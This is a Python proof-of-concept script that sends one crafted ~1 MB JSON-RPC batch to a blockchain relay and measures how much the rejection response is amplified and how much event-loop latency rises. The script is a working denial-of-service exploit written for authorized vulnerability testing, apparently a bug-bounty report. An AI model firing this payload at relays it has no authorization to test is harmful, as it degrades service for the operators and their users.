#!/usr/bin/env python3
"""
PoC / measurement harness for FINDING-001 — oversized-batch rejection amplification.

Sends ONE crafted ~1 MB batch request (an array of many tiny elements, which the
relay rejects with `BATCH_REQUESTS_AMOUNT_MAX_EXCEEDED`) and measures:

  1. the response size the relay actually returns, and the amplification factor,
  2. how long the relay took to answer the amplified request,
  3. the latency of trivial `eth_chainId` probes fired concurrently, versus a
     baseline measured just before — the event-loop-blocking signal.

This is a single-request, controlled test — NOT a flood. Run it only against a
relay you operate or are explicitly authorized to test.

Usage:
    RELAY_TARGET_URL=http://127.0.0.1:7546 python poc_batch_amplification.py
    python poc_batch_amplification.py --url http://127.0.0.1:7546 --size-mb 1
"""
import argparse
import json
import os
import statistics
import threading
import time
import urllib.request


def build_oversized_batch(size_mb: float) -> bytes:
    """A JSON array of the integer 1 repeated, sized to ~size_mb.
    Each element costs ~2 bytes ("1,"), maximizing element count for the byte budget."""
    target = int(size_mb * 1024 * 1024)
    n = max(1, (target - 2) // 2 + 1)
    # "[1" + ",1"*(n-1) + "]"
    return ("[1" + ",1" * (n - 1) + "]").encode("ascii"), n


def post(url: str, body: bytes, timeout: float):
    req = urllib.request.Request(
        url, data=body, headers={"Content-Type": "application/json"}, method="POST"
    )
    t0 = time.monotonic()
    with urllib.request.urlopen(req, timeout=timeout) as resp:
        data = resp.read()
    return time.monotonic() - t0, resp.status, data


def probe_latency(url: str) -> float:
    body = json.dumps({"jsonrpc": "2.0", "method": "eth_chainId", "params": [], "id": 1}).encode()
    t, _, _ = post(url, body, timeout=30)
    return t


def measure_baseline(url: str, samples: int = 8) -> float:
    lat = []
    for _ in range(samples):
        try:
            lat.append(probe_latency(url))
        except Exception:
            pass
        time.sleep(0.05)
    return statistics.median(lat) if lat else float("nan")


def main():
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--url", default=os.environ.get("RELAY_TARGET_URL", "http://127.0.0.1:7546"))
    ap.add_argument("--size-mb", type=float, default=1.0, help="request body size (should match/approach INPUT_SIZE_LIMIT)")
    ap.add_argument("--timeout", type=float, default=120.0)
    ap.add_argument("--probes", type=int, default=20, help="concurrent probes during the amplified request")
    args = ap.parse_args()

    print(f"Target: {args.url}")
    print("NOTE: run only against a relay you are authorized to test.\n")

    body, n = build_oversized_batch(args.size_mb)
    print(f"Crafted request: {len(body)/1024/1024:.3f} MB, {n:,} array elements\n")

    print("Measuring baseline eth_chainId latency (relay idle)...")
    try:
        baseline = measure_baseline(args.url)
        print(f"  baseline median: {baseline*1000:.1f} ms\n")
    except Exception as e:
        print(f"  baseline probe failed: {e}\n")
        baseline = float("nan")

    # Fire concurrent probes while the amplified request is in flight.
    probe_latencies = []
    stop = threading.Event()

    def probe_worker():
        while not stop.is_set():
            try:
                probe_latencies.append(probe_latency(args.url))
            except Exception:
                probe_latencies.append(float("nan"))
            time.sleep(0.02)

    workers = [threading.Thread(target=probe_worker, daemon=True) for _ in range(max(1, args.probes // 4))]
    for w in workers:
        w.start()

    print("Sending the amplified request...")
    try:
        elapsed, status, data = post(args.url, body, timeout=args.timeout)
    except Exception as e:
        stop.set()
        print(f"  request failed/timed out: {e!r}")
        print("  (a timeout on an 80x response is itself consistent with the finding)")
        return
    finally:
        stop.set()
        time.sleep(0.3)

    resp_mb = len(data) / 1024 / 1024
    amp = len(data) / len(body)
    during = [x for x in probe_latencies if x == x]  # drop NaN

    print(f"\n=== RESULT ===")
    print(f"HTTP status:            {status}")
    print(f"Request size:           {len(body)/1024/1024:.3f} MB")
    print(f"Response size:          {resp_mb:.1f} MB")
    print(f"Amplification factor:   {amp:.0f}x")
    print(f"Relay answer time:      {elapsed*1000:.0f} ms")
    if during:
        print(f"Concurrent-probe latency during amplified request:")
        print(f"    median {statistics.median(during)*1000:.1f} ms | max {max(during)*1000:.1f} ms | n={len(during)}")
        if baseline == baseline:
            print(f"    baseline was {baseline*1000:.1f} ms  ->  inflation x{statistics.median(during)/baseline:.1f} (median)")
    # Quick sanity on the body: it should be a JSON array of identical rejection errors
    try:
        parsed = json.loads(data)
        if isinstance(parsed, list):
            print(f"Response is an array of {len(parsed):,} elements "
                  f"(expected == request element count {n:,}: {'YES' if len(parsed)==n else 'NO'})")
            if parsed:
                msg = parsed[0].get("error", {}).get("message", "")
                print(f"First element error: {msg[:90]}")
    except Exception:
        print("Response was not parseable as JSON (may have been truncated by a proxy).")

    print("\nInterpretation: a large amplification factor AND a clear probe-latency inflation")
    print("confirm the event-loop-blocking DoS. Flat probes + small response => downgrade, do not submit.")


if __name__ == "__main__":
    main()
